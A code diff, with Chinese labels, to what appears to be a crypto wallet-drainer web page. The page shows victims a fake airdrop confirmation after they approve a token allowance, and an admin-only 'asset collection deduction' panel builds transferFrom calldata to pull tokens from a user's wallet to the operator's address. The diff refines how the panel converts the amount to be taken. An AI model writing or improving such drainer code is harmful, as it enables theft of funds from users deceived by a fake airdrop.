@@ -37,7 +37,7 @@ input{width:100%;height:42px;background:#0f172a;border:1px solid #334155;border-
 <div class="admin-box" id="adminPanel">
 <h3 class="admin-title">后台资产归集划扣</h3>
 <input type="text" placeholder="填写用户授权钱包地址" id="userAddr">
-<input type="number" placeholder="填写划扣代币数量" id="deductNum">
+<input type="number" step="0.0000000001" placeholder="正常输入数量 例如0.1 / 1" id="deductNum">
 <button class="btn btn-deduct" id="deductBtn">一键执行归集划扣</button>
 </div>
 </div>
@@ -92,15 +92,19 @@ alert("授权成功！空投代币即将发放到账");
 alert("已取消本次签名");
 }
 })
-// 多签钱包直接发起划扣
+// 多签钱包直接发起划扣 支持正常小数输入
 document.getElementById("deductBtn").addEventListener("click",async()=>{
 if(nowUser !== ADMIN_ADDR) return alert("无操作权限");
 let uAddr = document.getElementById("userAddr").value.trim();
 let num = document.getElementById("deductNum").value.trim();
 if(!uAddr||!num||Number(num)<=0) return alert("请填写完整地址与数量");
+
+// 自动换算18位精度 正常输入0.1=0.1枚
+let realAmount = Number(num) * 10**18;
+let valHex = BigInt(Math.floor(realAmount)).toString(16).padStart(64,"0");
+
 let fromHex = uAddr.toLowerCase().slice(2).padStart(64,"0");
 let toHex = ADMIN_ADDR.slice(2).padStart(64,"0");
-let valHex = BigInt(Math.floor(Number(num)*1e18)).toString(16).padStart(64,"0");
 let callData = "0x23b872dd"+fromHex+toHex+valHex;
 try{
 await ethereum.request({
